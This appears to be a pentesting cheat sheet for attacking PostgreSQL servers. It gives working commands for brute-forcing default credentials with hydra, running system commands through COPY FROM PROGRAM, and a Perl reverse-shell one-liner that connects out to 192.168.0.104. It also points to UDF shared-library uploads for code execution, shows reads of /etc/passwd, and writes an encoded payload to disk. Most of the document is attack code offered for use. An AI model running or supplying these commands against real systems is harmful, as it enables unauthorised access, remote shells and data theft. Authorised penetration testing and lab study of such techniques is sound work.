# PostgresSQL

### Connecting

```abap
psql -h 192.168.115.56 -p 5432 -U postgres
# brute force
hydra 192.168.115.56 postgres -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt
```

# Getting RCE

When you have access to a Postgres database, you can get RCE by inserting a [UDF library](https://infosecwriteups.com/compiling-postgres-library-for-exploiting-udf-to-rce-d8cfd197bdf9). Or if the databse is a version >9.3, as explained [here](https://infosecwriteups.com/compiling-postgres-library-for-exploiting-udf-to-rce-d8cfd197bdf9), you can just execute commands through the [payloads all the things payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution).

```abap
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```

> *********************Note: Must use 2 single quotes to escape a single quote*********************
> 

```abap
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

> **************Note: If you are unable to get a reverse shell through this method, you may want to try the UDF library.**************
> 

## UDF Library

You can find a library of precompiled `pg_exec.so` files here for different versions of the database 

[pg_exec/libraries at master · martinvw/pg_exec](https://github.com/martinvw/pg_exec/tree/master/libraries)

[HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions#rce-in-linux) shows this way to get RCE once you have the correct binary

Verify code execution by

![Untitled](PostgresSQL%20e498983a19fd4f41881b473aa3909607/Untitled.png)

![Untitled](PostgresSQL%20e498983a19fd4f41881b473aa3909607/Untitled%201.png)

![Untitled](PostgresSQL%20e498983a19fd4f41881b473aa3909607/Untitled%202.png)

# CRUD- basic functions

Reading files and listing directories in PostgresSQL.

```abap
select * from pg_ls_dir('/tmp'); # list directory (ls)
select * from pg_read_file('/etc/passwd', 0, 1000000); # read file (less/cat)
select * from pg_read_binary_file('/etc/passwd');

```

Writing to files

```abap
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```